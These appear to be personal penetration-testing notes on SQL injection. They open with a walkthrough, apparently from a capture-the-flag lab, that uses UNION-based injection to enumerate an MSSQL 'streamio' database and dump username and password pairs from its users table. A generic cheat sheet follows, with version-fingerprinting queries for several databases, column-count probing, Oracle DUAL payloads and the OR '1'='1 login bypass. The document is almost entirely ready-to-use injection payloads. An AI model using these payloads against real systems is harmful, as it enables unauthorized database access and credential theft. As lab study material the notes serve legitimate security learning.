
Test:

**NOTE:** Start with 1 and iterate until smth get's reflected! It will reflect the number which we can execute queries for.
```
' union select 1,2,3,4,5,6 -- -
```

The query returned 2, which means we can execute sql queries with the 2. number.

```
10' UNION SELECT 1, name, 3, 4, 5, 6 FROM sys.databases -- -
```

This displayed all databases, I'd like to enumerate the streamio database.

```
10' UNION SELECT 1, TABLE_NAME, 3, 4, 5, 6 FROM streamio.information_schema.tables -- -
```

This displayed two tables: movies & users. Let's dump the users table.

1. Identified columns in the table.

```
10' UNION SELECT 1, COLUMN_NAME, 3, 4, 5, 6 FROM streamio.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- -
```

Utilized the following query to dump the username & password column. This displayed tons of credentials/ encrypted passwords.

```
10' UNION SELECT 1, username + ':' + password, 3, 4, 5, 6 FROM streamio.dbo.users -- -
```
##### Querying database type and version

MSSQL

```
SELECT @@version
```

Oracle

```
SELECT * FROM v$version
```
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

PostgreSQL

```
SELECT version()
```
```
' UNION SELECT @@version--
```

##### UNION Attacks

For the UNION query to succeed, two requirements must be met:

- The number of columns must be the same.
- The data types of each column must match.
    
We can use the order by clause to determine the number of columns by observing the server's responses to these queries:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
###### Oracle UNION Attack

There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like

```
' UNION SELECT NULL FROM DUAL--
```

2 tables

```
'+UNION+SELECT+'abc','edw'+FROM+DUAL--
```
#### General SQL Injections

```
' OR '1'='1
```
URL Encoded Version

```
'+OR+1=1--
```